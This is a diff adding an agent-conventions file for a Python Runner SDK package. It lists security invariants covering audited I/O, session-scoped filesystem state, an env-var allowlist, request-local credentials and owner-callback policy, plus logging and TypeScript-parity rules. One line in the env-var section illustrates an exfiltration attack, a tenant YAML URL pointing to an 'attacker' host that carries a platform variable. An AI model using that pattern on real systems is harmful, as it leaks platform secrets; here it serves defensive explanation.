@@ -1,0 +1,193 @@
+agent-engine-runner-shared
+==========================
+
+Runner SDK conventions that extend the root
+`AGENTS.md <../../../../../AGENTS.md>`__. This file is auto-loaded by AI
+agents when working under
+``client-libraries/packages/python/packages/agent-engine-runner-shared/``.
+It captures invariants that apply specifically to the Runner SDK — the
+Python framework code that runs in the OE, AER, and Tool Pod.
+
+These invariants apply to the **platform framework code** in this
+package. They do NOT restrict what user-written agent code can import or
+do — that is enforced by the micro-VM at runtime.
+
+--------------
+
+Security Invariants
+-------------------
+
+1. Audited I/O path
+~~~~~~~~~~~~~~~~~~~
+
+The SecureToolWrapper
+(```src/agent_engine_runner_shared/secure_wrapper.py`` <src/agent_engine_runner_shared/secure_wrapper.py>`__)
+is the platform’s audited I/O layer. All ``@app.tool()`` and
+``app.get_llm()`` calls route through the Orchestration Engine for
+approval, logging, and policy enforcement. Framework code must not
+introduce shortcuts that bypass this path.
+
+- Do not add alternative I/O paths that skip the OE approval/logging
+  flow.
+- The framework code (``src/``) is the only code that implements the
+  wrapper internals.
+- Durable Workflow records that same path as OE events. Adapters must
+  not introduce a second persistence authority for LLM, tool, or Memory
+  effects. Teaching docs:
+  ```docs/orchestration-engine/durable-workflow/`` <../../../../../docs/orchestration-engine/durable-workflow/>`__.
+
+2. State must be fully serializable to JSON/BSON
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Agent pods are ephemeral — they can be terminated between execution
+steps (e.g., during human-in-the-loop review). On resume, a fresh pod
+restores state from the checkpoint. State carries forward, but only if
+it survives serialization.
+
+- **Allowed in agent state** (``TypedDict``, ``AgentState``): ``str``,
+  ``int``, ``float``, ``bool``, ``None``, ``list``, ``dict``,
+  ``datetime``, ``Enum``, and LangChain ``BaseMessage`` subclasses.
+  JSON-compatible primitives, standard Python collections, and
+  LangChain/LangGraph-native types work automatically.
+- **Forbidden in agent state**: lambdas, closures, function references,
+  file handles, DB connections, sockets, custom classes without
+  serialization support, thread/process objects.
+
+3. Tool Pod filesystem state is scoped per session
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+All Tool Pod filesystem handlers
+(```src/agent_engine_runner_shared/toolpod_handlers.py`` <src/agent_engine_runner_shared/toolpod_handlers.py>`__)
+scope on-disk state by the current session via
+``get_current_session_id()``. Bypassing ``_effective_workspace_dir()``
+and writing directly to ``WORKSPACE_DIR`` is a cross-session data leak —
+concurrent sessions on the same Tool Pod must never share filesystem
+state.
+
+- Do not call ``os.path.join(WORKSPACE_DIR, ...)`` directly in handler
+  code; route through ``_resolve()``.
+- Read-only bundled resources (e.g. agent skill files under
+  ``<agent-source-root>/skills/``, configured via
+  ``AGENTIC_AGENT_CONFIG_PATH`` / ``AGENTIC_AGENT_WORKDIR`` +
+  ``AGENTIC_SKILLS_DIR``) live **outside** ``WORKSPACE_DIR`` in the
+  read-only resource roots (``get_readonly_resource_roots()``).
+  Read-only handlers call ``_resolve(path, allow_readonly_roots=True)``
+  to reach them; mutating handlers (``filesystem_write``,
+  ``filesystem_edit``) do not pass that flag, so they cannot write
+  through to bundled resources.
+
+4. Platform env vars must be added to ``_PLATFORM_ENV_VARS``
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Tenant ``agent.yaml`` supports ``${VAR}`` interpolation at allowlisted
+paths (currently ``mcp.servers.*.url``). The substitution mapping is the
+**tenant-owned** subset of ``os.environ``, produced by
+``tenant_env_vars()`` in
+```src/agent_engine_runner_shared/utils.py`` <src/agent_engine_runner_shared/utils.py>`__.
+The filter relies on a fixed list of platform-owned names and prefixes —
+``_PLATFORM_ENV_VARS`` and ``_PLATFORM_ENV_VAR_PREFIXES`` — so a new
+platform-owned env var that is not added there is implicitly treated as
+tenant-owned and becomes dereferenceable from tenant YAML.
+
+- When you add a new platform env var read anywhere in
+  ``agent-engine-runner-shared`` (``runtime.py``, server modules,
+  launcher helpers, sandbox handlers, etc.), add its name to
+  ``_PLATFORM_ENV_VARS`` in the same change.
+- For families of vars sharing a common prefix (e.g. credential blobs
+  injected by the launcher), extend ``_PLATFORM_ENV_VAR_PREFIXES``
+  instead.
+- Forgetting this step lets tenant YAML do
+  ``url: https://attacker/${NEW_PLATFORM_VAR}`` and exfiltrate the value
+  via the resolved URL.
+
+5. Request-scoped credentials must not overlap through process-global state
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Per-request credentials (delegated tokens, brokered secrets) must stay
+request-local. Never write them into process-global state — including
+``os.environ`` — that a concurrent request on the same process can
+observe: two sessions sharing a pod would read each other’s credentials.
+Pass credentials through request context / function arguments, and if a
+library forces env-var configuration, isolate it per subprocess with an
+explicit environment rather than mutating the parent process env.
+
+6. Disconnect and cancellation paths must clean up
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Every code path that acquires request-scoped state (credentials,
+session-scoped files, in-flight approval bookkeeping) must release it on
+client disconnect and task cancellation, not only on normal completion.
+A disconnect that leaves credentials or session identity behind lets the
+next request on the same worker inherit them.
+
+7. Tool result content must never become control data
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Approval, resume, and session-control decisions must be driven by
+authenticated, typed control messages from the platform — never by a
+magic key, shape, or sentinel value found inside tool result content or
+LLM output. Untrusted content that can impersonate a control signal is
+an approval bypass. When adding a control path, define an explicit typed
+message and verify its origin; never pattern-match the data channel.
+
+8. Session/workspace identity must remain request-local
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+The session ID and workspace identity used for scoping (filesystem,
+memory, credentials) must be derived per request from the authenticated
+context, never cached in a process-global variable that a concurrent or
+later request could inherit.
+
+9. Owner-callback POSTs follow one shared policy
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+A request-supplied OE owner URL is untrusted until ``resolve_owner_url``
+(```src/agent_engine_runner_shared/server/owner_url.py`` <src/agent_engine_runner_shared/server/owner_url.py>`__)
+validates it as a headless replica of the configured service URL. Every
+POST to a validated owner URL follows one policy: the owner gets exactly
+one best-effort attempt with its own timeout; redirects are never
+followed (a 3xx from the owner host could forward the body past the
+validation boundary); **any** owner failure — transport error, 3xx, or
+other non-2xx — falls back to the trusted service URL; the owner is
+never retried; and OE/owner response bodies are never read or logged
+(they are externally influenced).
+
+Do not hand-roll this pattern. Use ``owner_delivered`` in
+```src/agent_engine_runner_shared/owner_callback.py`` <src/agent_engine_runner_shared/owner_callback.py>`__
+(sync) or its async twin ``_owner_delivered`` in
+```src/agent_engine_runner_shared/server/http_retry.py`` <src/agent_engine_runner_shared/server/http_retry.py>`__;
+the fallback status matrix is tested once against the helper, not per
+call site.
+
+--------------
+
+Logging levels
+--------------
+
+Runner SDK lifecycle and implementation diagnostics that are useful only
+to platform operators or SDK maintainers must use ``DEBUG``, not
+``INFO``. Reserve ``INFO`` and higher for customer-authored output and
+platform messages customers can act on. Keep levels aligned with the
+TypeScript counterpart for shared diagnostics.
+
+--------------
+
+Cross-language parity with ``agent-engine-runner-shared``
+---------------------------------------------------------
+
+This package has a TypeScript counterpart,
+```../../../javascript/packages/agent-engine-runner-shared/`` <../../../javascript/packages/agent-engine-runner-shared/>`__,
+that must stay behaviorally in sync for features that exist on both
+sides (e.g. ``launcher.py`` ↔ ``launcher.ts``, ``agent_config.py`` ↔
+``agent_config.ts``). Before changing a shared contract here — a
+launcher env-var name (``AGENT_ENTRYPOINT``,
+``AGENTIC_AGENT_CONFIG_PATH``), a runtime config key, an entrypoint
+convention, a default, or a behavioral/security invariant — check
+``../../../javascript/packages/agent-engine-runner-shared/`` for the
+equivalent module (same base filename) or symbol. If it exists, make the
+same change there in the same PR, or note in the PR why parity does not
+apply. If it does not exist, the feature is currently Python-only — do
+not port it just because it changed. The check against the counterpart
+code is the source of truth; do not rely on a remembered list of which
+features are TS-side. See `Cross-language
+parity <../../../../../docs/coding-standards.md#cross-language-parity-python--typescript>`__.
